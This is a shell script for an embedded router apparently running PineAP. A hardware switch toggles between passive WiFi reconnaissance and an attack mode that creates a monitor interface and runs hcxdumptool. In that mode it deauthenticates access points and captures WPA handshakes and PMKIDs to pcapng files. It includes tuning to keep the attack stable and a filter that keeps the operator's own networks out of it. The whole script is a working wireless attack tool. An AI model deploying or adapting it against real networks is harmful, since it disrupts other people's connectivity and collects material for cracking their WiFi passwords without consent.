#!/bin/sh
# Shadow-Apple hardware-switch mode daemon.
#   Switch FULL-LEFT  = RECON only              green LED
#   Switch RIGHT      = DEAUTH + HANDSHAKE CAPTURE (whitelist)  red LED
# Detection uses the LEFT gpio only (the RIGHT gpio never asserts on this unit).
#
# HARDWARE NOTE (AR300M + rt2800usb / RT5572): the USB Wi-Fi driver wedges if a
# monitor vif is created or active injection starts while the radio is busy or
# the system hasn't settled. A wedge trips the 30s watchdog -> reboot. To make
# that impossible to turn into a loop, and to keep boot always-stable:
#
#   1) DEAUTH NEVER AUTO-ARMS ON BOOT. Every boot comes up in RECON (green),
#      even if the switch is physically RIGHT. To enter deauth you must move the
#      switch to LEFT (recon, "safe") and then back to RIGHT -- an explicit arm.
#      => a deauth wedge -> reboot always lands back in recon. No loop, ever.
#   2) boot-settle grace: nothing fragile runs until the system is up ~90s.
#   3) failsafe flag .deauth_pending: set before hcx, cleared only after 75s of
#      stable capture; if it survives a reboot it's logged as "prior wedge".
#   4) deauth uses gentler settings (no client-attack flood) + a time-guarded
#      monitor bring-up (airmon can't hang the daemon forever).
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
LOG=/sd/bot/switch.log
HCXFILTER=/sd/bot/hcx-protect.list
OUT=/sd/handshakes
PIDF=/tmp/bot-mode.pid
PENDING=/sd/bot/.deauth_pending
SETTLE=90
RLED=/sys/class/leds/gl-ar300m:red:wlan/brightness
GLED=/sys/class/leds/gl-ar300m:green:system/brightness
led(){ for t in /sys/class/leds/gl-ar300m:*/trigger; do echo none > "$t" 2>/dev/null; done
  case "$1" in
    recon)  echo 0   > $RLED 2>/dev/null; echo 255 > $GLED 2>/dev/null;;
    deauth) echo 255 > $RLED 2>/dev/null; echo 0   > $GLED 2>/dev/null;;
  esac; }
blink_arm(){ i=0; while [ $i -lt 4 ]; do echo 255>$RLED 2>/dev/null;echo 0>$GLED 2>/dev/null;sleep 1
    echo 0>$RLED 2>/dev/null;echo 255>$GLED 2>/dev/null;sleep 1;i=$((i+1)); done; }
gval(){ grep "button $1" /sys/kernel/debug/gpio 2>/dev/null | grep -oE ' (lo|hi)' | tr -d ' ' | head -1; }
read_pos(){ [ "$(gval left)" = "hi" ] && echo LEFT || echo RIGHT; }
have(){ command -v "$1" >/dev/null 2>&1; }
tmo(){ if have timeout; then timeout "$@"; else shift; "$@"; fi; }   # busybox timeout guard
stop_all(){
  [ -f $PIDF ] && kill "$(cat $PIDF)" 2>/dev/null; rm -f $PIDF
  pkill hcxdumptool 2>/dev/null; killall mdk3 2>/dev/null
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf unpause   >/dev/null 2>&1
  sleep 4; }
start_recon(){ led recon
  ( while true; do
      pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
      W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done
    done ) & echo $! > $PIDF; }
start_deauth(){
  /sd/bot/wl-refresh.sh >/dev/null 2>&1
  # SAFETY: protected SSIDs configured but filter empty -> don't attack our own nets.
  if [ -s /sd/bot/protect-ssids.conf ] && [ ! -s "$HCXFILTER" ]; then
    echo "$(date) REFUSING deauth: protected SSIDs configured but filter empty -> recon" >> $LOG
    start_recon; return
  fi
  led deauth
  # free the radio fully before touching the monitor vif (prevents driver wedge).
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf pause     >/dev/null 2>&1
  sleep 4
  # bring up a monitor vif, reusing an existing one; airmon is time-guarded so a
  # hang can't freeze the daemon. Prefer iw create if airmon didn't make one.
  if ! iw dev 2>/dev/null | grep -q wlan1mon; then
    tmo 25 airmon-ng start wlan1 >/dev/null 2>&1
    iw dev 2>/dev/null | grep -q wlan1mon || iw dev wlan1 interface add wlan1mon type monitor >/dev/null 2>&1
    sleep 2
  fi
  MON=wlan1mon; iw dev 2>/dev/null | grep -q wlan1mon || MON=wlan1
  ip link set "$MON" up 2>/dev/null
  if ! iw dev "$MON" info 2>/dev/null | grep -q monitor; then
    echo "$(date) deauth abort: no monitor iface -> recon" >> $LOG; start_recon; return
  fi
  touch "$PENDING"                       # failsafe: cleared only after 75s stable
  FILT=""; [ -s "$HCXFILTER" ] && FILT="--filterlist_ap=$HCXFILTER --filtermode=1"
  TS=$(date +%Y%m%d_%H%M%S)
  echo "$(date) hcx attack on $MON (protect $([ -s "$HCXFILTER" ] && wc -l < "$HCXFILTER" || echo 0) BSSIDs, client-attacks off)" >> $LOG
  # --disable_client_attacks: skip the per-client deauth flood that overloads the
  # rt2800usb TX path; AP deauth + PMKID still capture handshakes, far more stable.
  /sd/usr/sbin/hcxdumptool -i "$MON" -o "$OUT/attack_$TS.pcapng" -t 5 $FILT \
      --disable_client_attacks --enable_status=3 >> "$OUT/hcx-status.log" 2>&1 &
  HP=$!; echo $HP > $PIDF
  # if hcx dies within 8s it rejected an option / the driver wedged: fall back.
  ( sleep 8; kill -0 "$HP" 2>/dev/null || { echo "$(date) hcx exited early -> recon" >> $LOG; led recon; }
    sleep 67; kill -0 "$HP" 2>/dev/null && rm -f "$PENDING" ) &   # 75s total stable -> clear failsafe
}
mount | grep -q '/sys/kernel/debug' || mount -t debugfs none /sys/kernel/debug 2>/dev/null
echo "$(date) switch-mode daemon start" >> $LOG
# ---- boot policy: ALWAYS start in recon; deauth must be armed by LEFT->RIGHT ----
FORCE_RECON=1
if [ -f "$PENDING" ]; then
  rm -f "$PENDING"
  echo "$(date) boot: prior deauth did not stabilize (wedge). recon held; arm again with LEFT->RIGHT" >> $LOG
else
  echo "$(date) boot: recon by default. move switch LEFT then RIGHT to arm deauth" >> $LOG
fi
led recon
# boot-settle grace (skipped once already up SETTLE seconds)
UP=$(cut -d. -f1 /proc/uptime 2>/dev/null); UP=${UP:-999}; G=$((SETTLE-UP)); [ "$G" -gt 0 ] && sleep "$G"
# if held (switch is RIGHT at boot) flash the arm hint once, then solid green recon
[ "$(read_pos)" = "RIGHT" ] && blink_arm
led recon
CUR=""; PEND=""; STABLE=0
while true; do
  P=$(read_pos)
  if [ "$FORCE_RECON" = 1 ]; then
    if [ "$P" = "LEFT" ]; then FORCE_RECON=0; else P=LEFT; fi   # arm cleared by visiting LEFT
  fi
  if [ "$P" = "$PEND" ]; then STABLE=$((STABLE+1)); else PEND="$P"; STABLE=1; fi
  if [ "$STABLE" -ge 2 ] && [ "$P" != "$CUR" ]; then
    echo "$(date) -> $P (left=$(gval left))" >> $LOG
    stop_all
    case "$P" in LEFT) start_recon;; RIGHT) start_deauth;; esac
    CUR="$P"
  fi
  sleep 3
done
